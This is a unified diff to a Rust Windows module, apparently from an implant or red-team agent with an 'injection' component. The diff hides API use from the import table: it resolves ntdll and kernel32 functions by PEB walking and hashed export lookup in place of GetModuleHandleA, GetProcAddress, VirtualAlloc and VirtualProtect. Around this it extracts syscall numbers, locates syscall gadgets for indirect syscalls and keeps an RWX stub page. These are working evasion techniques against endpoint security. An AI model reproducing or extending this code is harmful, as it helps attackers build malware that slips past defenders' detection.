@@ -13,16 +13,15 @@
 
 #[cfg(target_os = "windows")]
 pub mod win {
-    use std::ffi::{c_void, CString};
+    use std::ffi::c_void;
     use std::ptr;
     use std::mem;
     use crate::strcrypt_rt;
     use strcrypt::aes_str;
 
-    extern "system" {
-        fn GetModuleHandleA(name: *const i8) -> *mut c_void;
-        fn GetProcAddress(module: *mut c_void, name: *const i8) -> *mut c_void;
-    }
+    // GetModuleHandleA/GetProcAddress are NOT statically imported here:
+    // ntdll resolution goes through the PEB/EAT resolver so the import
+    // table stays clean.
 
     /// Extract the syscall number from a native API function in ntdll.
     /// On x64 Windows, Nt* functions in ntdll follow the pattern:
@@ -62,12 +61,15 @@ pub mod win {
     }
 
     unsafe fn resolve_ssn_uncached(func_name: &str) -> Option<u32> {
-        let ntdll_name = CString::new(aes_str!("ntdll.dll")).unwrap();
-        let ntdll = GetModuleHandleA(ntdll_name.as_ptr());
+        // PEB walk for the ntdll base, export-table walk for the function
+        // pointer - no GetModuleHandleA/GetProcAddress imports.
+        let ntdll = crate::agent::injection::win_resolve::mod_handle(b"ntdll.dll\0") as *mut c_void;
         if ntdll.is_null() { return None; }
 
-        let cname = CString::new(func_name).ok()?;
-        let func = GetProcAddress(ntdll, cname.as_ptr());
+        let func = crate::agent::injection::win_resolve::resolve_ptr(
+            b"ntdll.dll\0",
+            crate::agent::injection::win_resolve::fnv1a_32(func_name.as_bytes()),
+        ) as *mut c_void;
         if func.is_null() { return None; }
 
         let bytes = std::slice::from_raw_parts(func as *const u8, 32);
@@ -221,8 +223,8 @@ pub mod win {
     }
 
     unsafe fn find_syscall_gadget_uncached() -> Option<*const u8> {
-        let ntdll_name = CString::new(aes_str!("ntdll.dll")).unwrap();
-        let ntdll = GetModuleHandleA(ntdll_name.as_ptr());
+        // PEB walk for the ntdll base (no GetModuleHandleA import).
+        let ntdll = crate::agent::injection::win_resolve::mod_handle(b"ntdll.dll\0") as *mut c_void;
         if ntdll.is_null() { return None; }
 
         // Parse PE headers to find .text section
@@ -410,8 +412,13 @@ pub mod win {
     fn get_stub_page() -> *mut c_void {
         use std::sync::OnceLock;
         static STUB: OnceLock<usize> = OnceLock::new();
-        extern "system" {
-            fn VirtualAlloc(addr: *mut c_void, size: usize, at: u32, prot: u32) -> *mut c_void;
+        // Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+        unsafe fn VirtualAlloc(addr: *mut c_void, size: usize, at: u32, prot: u32) -> *mut c_void {
+            type F = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
+            static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+            let p = *P.get_or_init(|| crate::agent::injection::win_resolve::resolve_ptr(b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualAlloc")));
+            let f: F = unsafe { std::mem::transmute(p) };
+            unsafe { f(addr, size, at, prot) }
         }
         // OS page size - fixed by the architecture, not a tunable.
         const PAGE_SIZE: usize = 4096;
@@ -444,8 +451,13 @@ pub mod win {
     /// For direct mode: the stub ends with `syscall; ret`
     /// For indirect mode: the stub ends with `jmp <ntdll_gadget>`
     unsafe fn syscall_generic(ssn: u32, indirect: bool, args: &[usize]) -> i32 {
-        extern "system" {
-            fn VirtualProtect(addr: *mut c_void, size: usize, new: u32, old: *mut u32) -> i32;
+        // Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+        unsafe fn VirtualProtect(addr: *mut c_void, size: usize, new: u32, old: *mut u32) -> i32 {
+            type F = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
+            static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+            let p = *P.get_or_init(|| crate::agent::injection::win_resolve::resolve_ptr(b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"VirtualProtect")));
+            let f: F = unsafe { std::mem::transmute(p) };
+            unsafe { f(addr, size, new, old) }
         }
         // No protection flags needed here: the stub page stays RWX from
         // init (see get_stub_page), so VirtualProtect is never re-called.
